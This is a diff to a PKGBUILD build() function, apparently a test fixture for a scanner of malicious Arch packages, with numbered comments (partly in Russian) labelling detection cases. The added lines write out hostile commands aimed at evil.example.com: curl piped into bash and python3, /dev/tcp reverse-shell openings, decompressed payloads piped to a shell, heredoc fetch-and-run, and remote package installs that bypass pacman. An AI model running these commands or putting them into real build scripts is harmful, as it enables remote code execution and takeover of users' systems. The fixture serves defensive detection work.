@@ -32,6 +32,20 @@ build() {
   lua -e 'os.execute("id")'                                  # [24] lua -e inline exec
   sh -c 'exec 3<>/dev/tcp/evil.example.com/443'              # [25] sh -c + /dev/tcp (reverse shell)
   npm install atomic-lockfile                                # [18]+[19] foreign PM + IOC Atomic Arch
+  bash <(curl -sSL https://evil.example.com/bx)              # [26] process substitution сразу в шелл
+  curl -sSL https://evil.example.com/py | python3 -          # [27] curl пайпом в интерпретатор
+  gunzip -c payload.gz | sh                                  # [28] decompress | shell
+  zstd -dc payload.zst | bash                                # [29] decompress | shell (zstd)
+  cargo install evil-cli                                     # [30] удалённый crate мимо pacman
+  go install github.com/evil/tool@latest                     # [31] удалённый go-модуль мимо pacman
+  pnpm add lockfile-js                                       # [32] pnpm + IOC Atomic Arch
+  exec 3<>/dev/tcp/evil.example.com/443                      # [33] /dev/tcp без обёртки в sh -c
+  cat <<'EOF' | sh                                           # [34] heredoc-пайп в шелл
+echo pwned
+EOF
+  bash <<'EOS'                                               # [35] heredoc: fetch и запуск на разных строках
+curl -sSL https://evil.example.com/hb | bash
+EOS
 }
 
 package() {
